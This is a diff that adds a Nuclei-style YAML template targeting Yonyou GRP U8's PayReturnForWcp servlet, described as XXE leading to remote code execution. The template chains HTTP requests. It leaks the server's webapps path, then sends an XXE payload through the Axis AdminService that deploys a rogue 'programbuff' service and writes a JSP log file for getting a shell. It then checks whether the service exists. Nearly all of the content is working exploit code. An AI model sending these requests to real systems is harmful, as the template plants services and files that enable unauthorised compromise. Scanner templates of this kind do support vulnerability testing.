@@ -1,0 +1,58 @@
+id: yonyou-grp-u8-PayReturnForWcp-rce
+info:
+  name: 用友 GRP U8 PayReturnForWcp - xxe to rce
+  author: leadlife
+  severity: critical
+  description: 
+  reference: 
+    - https://mp.weixin.qq.com/s/tBAlPMxWxHMVSc72pPS5wQ
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips: getshell use services/programbuff 参考 ref https://mp.weixin.qq.com/s/tBAlPMxWxHMVSc72pPS5wQ, 这里 poc 狭隘, 但没办法, 原版 poc 找不到
+    repair: 用友云盘:https://pan.yonyou.com/s/gUWlv8QkSsY 密码:a61h
+  tags: rce,yonyou,grpu8,oa,2024
+
+http:
+  - raw:
+      - |
+        GET /u8qx/pubDownTemplate.jsp HTTP/1.1
+        Host: {{Hostname}}
+    
+      - |+
+        POST /servlet/PayReturnForWcp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 834
+
+        <?xml version="1.0"?>
+        <!DOCTYPE foo SYSTEM "http://{{Hostname}}/services/AdminService?method=!--%3E%3Cdeployment%20xmlns%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22%20xmlns%3Ajava%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2Fproviders%2Fjava%22%3E%3Cservice%20name%3D%22programbuff%22%20provider%3D%22java%3ARPC%22%3E%3CrequestFlow%3E%3Chandler%20type%3D%22java%3Aorg.apache.axis.handlers.LogHandler%22%20%3E%3Cparameter%20name%3D%22LogHandler.fileName%22%20value%3D%22{{path}}\ttt2.jsp%22%20%2F%3E%3Cparameter%20name%3D%22LogHandler.writeToConsole%22%20value%3D%22false%22%20%2F%3E%3C%2Fhandler%3E%3C%2FrequestFlow%3E%3Cparameter%20name%3D%22className%22%20value%3D%22java.util.Random%22%20%2F%3E%3Cparameter%20name%3D%22allowedMethods%22%20value%3D%22*%22%20%2F%3E%3C%2Fservice%3E%3C%2Fdeployment">
+      
+      - |+
+        GET /services HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+      - type: regex
+        part: body_1
+        name: path
+        internal: true
+        regex:
+          - "[a-zA-Z]:\\\\(?:[^\\\\/:*?\"<>|\\r\\n()]+\\\\)*[^\\\\/:*?\"<>|\\r\\n()]+\\\\webapps"
+
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 500 && status_code_2 == 200 && status_code_3 == 200
+          - contains(body_3,'programbuff')
+        condition: and
+
+      - type: dsl
+        dsl:
+          - status_code_1 == 500 && status_code_2 == 500 && status_code_3 == 200
+          - contains(body_3,'programbuff')
+        condition: and
